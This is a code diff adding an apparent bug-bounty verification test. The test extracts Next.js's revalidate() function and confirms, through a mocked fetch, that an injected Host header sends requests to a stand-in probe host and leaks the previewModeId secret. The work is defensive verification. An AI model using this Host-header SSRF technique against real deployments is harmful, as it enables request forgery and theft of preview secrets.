@@ -673,3 +673,163 @@ describe('buildFunctionTarget + buildInjectionParams', () => {
     funcNode!.param_names = saved;
   });
 });
+
+
+// ---------------------------------------------------------------------------
+// E2E: Next.js api-resolver.ts SSRF verification via FunctionChannel
+// ---------------------------------------------------------------------------
+
+const NEXTJS_API_RESOLVER_PATH =
+  'C:/Users/pizza/bounty-targets/nextjs/packages/next/src/server/api-utils/node/api-resolver.ts';
+
+describe.runIf(fs.existsSync(NEXTJS_API_RESOLVER_PATH))(
+  'E2E: Next.js api-resolver.ts SSRF verification',
+  () => {
+    it('FunctionChannel confirms SSRF via Host header injection in revalidate()', async () => {
+      // 1. Read the real api-resolver.ts file
+      const apiResolverSource = fs.readFileSync(NEXTJS_API_RESOLVER_PATH, 'utf-8');
+
+      // 2. Extract the revalidate function (lines 248-329)
+      const lines = apiResolverSource.split('\n');
+      const revalidateSource = lines.slice(247, 329).join('\n');
+
+      // Sanity: the extracted source should contain the vulnerable fetch pattern
+      expect(revalidateSource).toContain('req.headers.host');
+      expect(revalidateSource).toContain('fetch(');
+      expect(revalidateSource).toContain('trustHostHeader');
+
+      // 3. Strip TypeScript annotations so the source runs as plain JavaScript.
+      //    The extracted source is .ts — the harness executes as .mjs under Node.
+      //
+      //    Key TS constructs to remove:
+      //    - Function parameter type annotations (: string, : IncomingMessage, etc.)
+      //    - Inline object type annotations in parameters (opts: { ... })
+      //    - Variable type annotations (const x: Type = ...)
+      //    - Catch clause type annotations (catch (err: unknown))
+      //    - Type assertions (expr as Type)
+      //    - Optional property markers (prop?: type)
+      //
+      //    Rather than building a full TS->JS transpiler, we replace the known
+      //    function signature and problematic annotations directly. This is safe
+      //    because we know the exact source we're extracting.
+
+      let jsSource = revalidateSource;
+
+      // Replace the full TS function signature with a plain JS one
+      jsSource = jsSource.replace(
+        /async\s+function\s+revalidate\s*\([^)]*\)\s*\{/s,
+        'async function revalidate(urlPath, opts, req, context) {',
+      );
+
+      // Strip variable type annotations:  const x: Type = ...  ->  const x = ...
+      jsSource = jsSource.replace(/const\s+(\w+)\s*:\s*\w+\s*=/g, 'const $1 =');
+
+      // Strip catch clause type annotations:  catch (err: unknown)  ->  catch (err)
+      jsSource = jsSource.replace(/catch\s*\(\s*(\w+)\s*:\s*\w+\s*\)/g, 'catch ($1)');
+
+      // Strip 'as string' type assertions
+      jsSource = jsSource.replace(/\s+as\s+string/g, '');
+
+      // 4. Build wrapper function with inlined dependencies
+      //
+      // The revalidate function takes 4 complex parameters:
+      //   revalidate(urlPath, opts, req, context)
+      //
+      // We create a wrapper __ssrf_test(hostname) that constructs all 4 params
+      // with the hostname injected into req.headers.host, and context set so
+      // the code path reaches the vulnerable fetch call.
+      //
+      // Key: context.internalRevalidate must be falsy (otherwise it short-circuits
+      // before the fetch), and context.trustHostHeader must be true.
+      const wrapperSource = `
+// Inlined constants from Next.js source
+const PRERENDER_REVALIDATE_HEADER = 'x-prerender-revalidate';
+const PRERENDER_REVALIDATE_ONLY_GENERATED_HEADER = 'x-prerender-revalidate-only-generated';
+function isError(err) { return err instanceof Error; }
+
+// Original revalidate function extracted from api-resolver.ts lines 248-329
+// (TypeScript annotations stripped for plain JS execution)
+${jsSource}
+
+// Wrapper: takes a simple hostname string, constructs the complex objects,
+// and calls revalidate() so the tainted hostname reaches fetch().
+async function __ssrf_test(hostname) {
+  const req = { headers: { host: hostname } };
+  const context = {
+    trustHostHeader: true,
+    previewModeId: 'test-secret-id',
+    allowedRevalidateHeaderKeys: [],
+    // internalRevalidate intentionally omitted — must be falsy
+    // so execution reaches the fetch() call on line 302
+  };
+  try {
+    await revalidate('/test-path', {}, req, context);
+  } catch (e) {
+    // Expected — we only care whether fetch was called with the canary host
+  }
+}
+`;
+
+      // 5. Create FunctionTarget pointing at the wrapper
+      const target: FunctionTarget = {
+        source_file: 'api-resolver.ts',
+        function_name: '__ssrf_test',
+        line_start: 1,
+        line_end: wrapperSource.split('\n').length,
+        function_source: wrapperSource,
+        language: 'javascript',
+      };
+
+      // 6. Create injection params — canary goes into the 'hostname' parameter
+      const injection: FunctionInjectionParams = {
+        target_param: 'hostname',
+        param_index: 0,
+        other_params: [],
+        sink_mocks: [{ module: 'global', method: 'fetch' }],
+      };
+
+      // 7. Execute via FunctionChannel
+      const channel = new FunctionChannel({ timeout_ms: 10000 });
+      channel.registerTarget(target, injection);
+
+      const canary = 'dst-ssrf-probe.example.com';
+      const deliveryTarget = encodeFunctionTarget(target);
+      const deliveryParams = encodeFunctionParams(injection);
+
+      const result = await channel.deliver(canary, deliveryTarget, deliveryParams);
+
+      // 8. Verify delivery succeeded
+      expect(result.delivered).toBe(true);
+      expect(result.status_code).toBe(200);
+
+      const report: HarnessReport = JSON.parse(result.body);
+      expect(report.completed).toBe(true);
+
+      // 9. Verify that fetch was called with the canary hostname
+      const fetchCalls = report.sink_calls.filter(sc => sc.sink.includes('fetch'));
+      expect(fetchCalls.length).toBeGreaterThanOrEqual(1);
+      expect(fetchCalls[0].canary_found).toBe(true);
+
+      // The URL should be https://dst-ssrf-probe.example.com/test-path
+      const urlArg = fetchCalls[0].args[0];
+      expect(urlArg).toContain('dst-ssrf-probe.example.com');
+      expect(urlArg).toContain('/test-path');
+
+      // 10. Verify the previewModeId secret leaked in the request headers
+      //    The harness records the headers as the 3rd arg to the mock fetch
+      const headersArg = fetchCalls[0].args[2]; // JSON.stringify(headers)
+      expect(headersArg).toContain('test-secret-id');
+      expect(headersArg).toContain('x-prerender-revalidate');
+
+      // 11. Oracle confirms: canary reached a dangerous sink
+      const observation = channel.observe(
+        { type: 'content_match', pattern: 'dst-ssrf-probe', positive: true },
+        result,
+      );
+      expect(observation.signal_detected).toBe(true);
+      expect(observation.confidence).toBe('high');
+      expect(observation.evidence).toContain('dst-ssrf-probe');
+      expect(observation.evidence).toContain('global.fetch');
+    }, 15000);
+  },
+);
